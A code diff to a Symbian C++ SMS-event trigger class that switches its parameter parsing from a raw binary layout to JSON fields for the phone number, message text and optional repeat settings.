@@ -14,6 +14,8 @@
 #include <txtrich.h>
 #include <smuthdr.h>
 
+#include "Json.h"
+
 CEventSms::CEventSms(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_Sms, aTriggerId)
 	{
@@ -75,31 +77,49 @@ void CEventSms::ConstructL(const TDesC8& params)
 	
 	// Parses the parameters...
 
-	// Reads the Number
-	TUint8* ptr8 = (TUint8 *) iParams.Ptr();
-	TUint32 lenNumb = 0;
-	Mem::Copy(&lenNumb, ptr8, 4);
-	ptr8 += 4;
-
-	if (lenNumb > 0)
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
 		{
-		TUint8 totChars = (lenNumb-1) / 2;
-		TPtr16 ptrNum((TUint16 *) ptr8, totChars, totChars);
-		iSmsNumber.Copy(ptrNum);
+		paramsBuf.Copy(params);
 		}
-	ptr8 += lenNumb;
-	
-	// Reads the Text
-	TUint32 lenText = 0;
-	Mem::Copy(&lenText, ptr8, 4);
-	ptr8 += 4;
-
-	if (lenText > 0)
+	else
 		{
-		TUint8 totChars = (lenText-1) / 2;
-		TPtr16 ptrText((TUint16 *) ptr8, totChars, totChars);
-		iSmsText.Copy(ptrText);
+		//TODO: not enough memory
 		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve tel number
+		rootObject->GetStringL(_L("number"),iSmsNumber);
+		//retrieve text
+		rootObject->GetStringL(_L("text"), iSmsText);
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iIter);
+			rootObject->GetIntL(_L("delay"),iDelay);
+			}
+		else
+			{
+			iRepeatAction = -1;
+			iIter = 0;
+			iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 	}
 
 void CEventSms::StartEventL()
